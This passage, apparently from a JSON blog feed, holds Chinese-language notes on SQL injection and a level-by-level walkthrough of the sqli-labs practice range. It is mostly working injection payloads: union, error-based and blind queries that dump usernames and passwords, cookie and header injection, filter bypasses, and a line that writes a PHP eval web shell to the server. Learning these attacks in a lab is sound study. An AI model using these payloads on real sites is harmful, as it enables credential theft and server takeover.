class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$title</span>,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;INSERT INTO wp_news VALUES(2,&#x27;<span class=\"subst\">$title</span>&#x27;,&#x27;<span class=\"subst\">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>假如输入 aaaaaaaaa’,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">自动转义为aaaaaaaaa\\&#x27;,由于字符串长度限制被截取为aaaaaaaaa\\,转义了预置的单引号,就能注入了</span><br><span class=\"line\">?title=aaaaaaaaa&#x27;&amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#</span><br></pre></td></tr></table></figure>\n<p>sql 语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;aaaaaaaaa&#x27;</span>,<span class=\"string\">&#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>此时表</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">title</th>\n<th style=\"text-align:center\">content</th>\n<th style=\"text-align:center\">time</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">this is title</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">aaaaaaaaa’,</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">admin_password</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>可发现新加了两行，成功注入</p>\n<p>mid () 函数<br>\n select mid (column_name,start,length)<br>\n right () 函数<br>\n从指定字符串的<mark>右侧</mark>提取给定长度的字符<br>\n select right (column_name,length)<br>\n substr () 函数<br>\n与 mid () 一样<br>\n reverse () 函数<br>\n反转字符串</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "url": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "title": "Sqli-labs靶场通关",
            "date_published": "2023-04-28T07:34:52.582Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 2-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数<br>\n MySQL 的一些表结构：(可以通过 phpmyadmin 观察学习)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">information_schema是MySQL自带的默认数据库,里面有三个</span><br><span class=\"line\">表(schemata,tables,columns)</span><br><span class=\"line\"></span><br><span class=\"line\">schemata表(记载着数据库的信息),这个表里面有个字段schema_name(数据库名)</span><br><span class=\"line\"></span><br><span class=\"line\">tables(表),里面有table_name字段(数据表名),和table_schema字段(当前字段所属数据表所在的数据库)</span><br><span class=\"line\">比如security库里面有email表:</span><br><span class=\"line\"></span><br><span class=\"line\">table_schema  table_name</span><br><span class=\"line\">security        email</span><br><span class=\"line\"></span><br><span class=\"line\">columns表,除了table_name和table_schema字段外还有一个column_name字段(某数据库某个表的某个字段名)</span><br></pre></td></tr></table></figure>\n<p>less1<br>\n 字符型注入<br>\n看源码: <code>sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code></p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; order by 3--+</span><br><span class=\"line\">?id=1&#x27; order by 4--+</span><br><span class=\"line\">?id=-1&#x27; union select 1,2,3--+//判断回显位</span><br><span class=\"line\">?id=-1&#x27; union select 1,2,database()--+</span><br><span class=\"line\">?id=-1&#x27; union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(username,0x7e,password) from users--+</span><br><span class=\"line\">//0x7e是为了让结过美观一点,比如Dumb~Dumb</span><br></pre></td></tr></table></figure>\n<p>此外通过 <code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code>  还有可以看到所以的数据库信息</p>\n<p>less2<br>\n 数字型<br>\n看源码: <code>sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code> <br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1 union select 1,2,group_concat(username,0x7e,password) from users</span><br></pre></td></tr></table></figure>\n<p>less3<br>\n 源码: <code>$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;</code> <br>\n 单引号括号字符型闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(username,0x7e,password) from users--+</span><br></pre></td></tr></table></figure>\n<p>less4<br>\n 源码: <code>$id = '&quot;' . $id . '&quot;';$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code> <br>\n 双引号括号字符型闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(username,0x7e,password) from users--+</span><br></pre></td></tr></table></figure>\n<p>less5<br>\n 此题不回显 SQL 语句的结果了，只回显 (You are in… 或者无回显), 但是源代码有 <code>print_r(mysql_error());</code>  会将语法错误打印出来，我们已知字段数是 3, 写入 <code>?id=1' order by 4--+</code>  发现成功回显，因此可以用报错注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">报错注入:updatexml()函数,extractvalue()函数</span><br><span class=\"line\">updatexml(xml_doument,XPath_string,new_value)</span><br><span class=\"line\">第一个参数：XML的内容</span><br><span class=\"line\">第二个参数：是需要update的位置XPATH路径</span><br><span class=\"line\">第三个参数：是更新后的内容</span><br><span class=\"line\">所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容</span><br><span class=\"line\">可以校验的:0x7e(~),0x5e24(^$),&#x27;#&#x27;(#)</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue（XML_document，xpath_string）</span><br><span class=\"line\">第一个参数是XML对象的名称,随便写,第二个参数是XPAT和格式的字符串,主要让它格式出现错误</span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">一些截取函数技巧:</span><br><span class=\"line\">concat(参数1,参数2) 将参数1与参数2连接起来</span><br><span class=\"line\">substring(目标,起始,长度)</span><br><span class=\"line\">substr,mid用法一样</span><br><span class=\"line\">还有right(column_name,length)从右侧读取length长度和reverse()反转字符串函数</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,database()),1)--+暴当前数据库</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">此时会出现Subquery returns more than 1 row</span><br><span class=\"line\">根据提示可以知道结果有多行,本地复现一下</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select table_name from information_schema.tables where table_schema=database();</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| table_name |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| emails     |</span><br><span class=\"line\">| referers   |</span><br><span class=\"line\">| uagents    |</span><br><span class=\"line\">| users      |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.可以用limit解决,limit 0,1 1,1 2,1 3,1</span><br><span class=\"line\">在limit 3,1找到users表</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 3,1)),1)--+</span><br><span class=\"line\">后面同理爆字段,不过很麻烦</span><br><span class=\"line\"></span><br><span class=\"line\">2.加个group_concat(将多行数据用逗号连接)把所有表名连接成一行</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">此时结果:</span><br><span class=\"line\"> emails,referers,uagents,users</span><br><span class=\"line\">最后:</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),1)--+</span><br><span class=\"line\">这时问题又来了,只能读取前面的(31个字符),这时候需要用来截取函数了</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,31)),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">在改变1和31的值来读后面的内容</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\">然后遇到和上面一样的问题</span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,substr(concat(0x7e,(select group_concat(username,0x7e,password) from users)),1,31))--+</span><br><span class=\"line\"></span><br><span class=\"line\">然后修改1,31的值</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>floor () 报错注入<br>\n <code>select count(*),concat_wa('-',(select database()),floor(rand(0)* 2)) as x from information_schema.tables group by x;</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rand():随机返回<span class=\"number\">0</span><span class=\"operator\">~</span><span class=\"number\">1</span>之间的小数</span><br><span class=\"line\">rand()<span class=\"operator\">*</span><span class=\"number\">2</span>:随机返回<span class=\"number\">0</span><span class=\"operator\">~</span><span class=\"number\">2</span>之间的小数</span><br><span class=\"line\"><span class=\"built_in\">floor</span>():小数向下取整数</span><br><span class=\"line\">concat_ws(参数<span class=\"number\">1</span>,参数<span class=\"number\">2</span>,参数<span class=\"number\">3</span>):将括号内数据用第一个字段连接起来</span><br><span class=\"line\">例: concat_ws(<span class=\"string\">&#x27;~&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>) 结果为 <span class=\"number\">1</span><span class=\"operator\">~</span><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">group</span> <span class=\"keyword\">by</span>语句:分组统计</span><br><span class=\"line\"><span class=\"keyword\">as</span>:赋予别名</span><br><span class=\"line\"><span class=\"built_in\">count</span>():汇总统计</span><br><span class=\"line\"></span><br><span class=\"line\">一次只能返回<span class=\"number\">64</span>个字符</span><br><span class=\"line\"></span><br><span class=\"line\">原理</span><br><span class=\"line\">通过<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>)产生的有一定顺序的数,在分组统计的时候重复计算导致最后只有一组数据产生错误</span><br></pre></td></tr></table></figure>\n<p>payload3:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select substring(group_concat(username,&#x27;-&#x27;,password),1,64) from users),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">修改1,64即可</span><br></pre></td></tr></table></figure>\n<p>less6<br>\nid=1&quot; 与 less5 一样</p>\n<p>less7<br>\n 双括号单引号字符型，导出文件注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\test.php&quot; --+</span><br></pre></td></tr></table></figure>\n<p>less8 与 less5 一样<br>\n less9 时间盲注<br>\n less10 双引号时间盲注</p>\n<p>less11<br>\n 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克<br>\n less12<br>\n&quot;) 型，联合注入<br>\n less13<br>\n)’ # 加上报错注入<br>\n less14<br>\n“# 加上报错注入<br>\n less15<br>\n 不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ --+<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=\"> 用脚本 less15.py</span><br>\n 用法:<br>\nfrom less15 import *<br>\nDatabase15()<br>\nTables15()<br>\n Columns15 (‘库’,‘表’)<br>\n Content15 (‘库’,‘表’,‘字段’,‘字段’)<br>\nless16<br>\n 双引号字符型加括号的盲注<br>\n 1”) --+<br>\n 脚本:less16.py</p>\n<p>less17<br>\n1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<p>less18<br>\n 注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>\n 与 18 一样，注入点在 referer</p>\n<p>less20<br>\n 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=Dumb&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">为什么写成这种格式？使整个SQL语句为恒真，不管Dumb是否正确都能爆出结果</span><br></pre></td></tr></table></figure>\n<p>less21<br>\n 登录 burp 抓到两个包，第一个是发送用户名和密码的 POST 报文，第二个是 GET 报文且携带 cookie</p>\n<p>Cookie：uname=…<br>\n 这个… 是 base64 编码的，通过 burp 的 decoder 模块使用可以看出<br>\n单引号单括号字符型报错注入，需要把 payload 进行 base64 编码，（如果 base64 编码结果包含等号还要进行 url 编码），再作为 uname 的值发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;) or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or (&#x27;</span><br></pre></td></tr></table></figure>\n<p>经过 base64 编码没有等号，直接用</p>\n<p>less22<br>\nless21 单引号 -&gt; 双引号</p>\n<p>less23<br>\n 又回到了 get 方法，这里过滤了 <code>--和#</code> ,%23 尝试不行，于是换一种方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,3 or &#x27;</span><br><span class=\"line\">构造恒真语句,or &#x27;表示true(1),3 or &#x27;就是1</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x7e,password) from users),3 or &#x27;</span><br></pre></td></tr></table></figure>\n<p>less24<br>\n 二次注入<br>\n login.php 中对输入的 username 和 password 进行了 mysql_real_escape_string () 函数处理，转义了单引号等字符<br>\n在注册用户和修改密码的所有输入参数也做了这个处理</p>\n<p>注册用户名 admin’#, 密码随意，登录进去修改密码为 456<br>\n 这时的 SQL 语句: <code>$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;</code> <br>\n 造成:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;456&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>再直接 admin,456 就登录了</p>\n<p>less25<br>\n 单引号字符型，过滤了 and 和 or<br>\n 双写绕过:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>\n<p>less25a<br>\n 没有单引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1 union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        }
    ]
}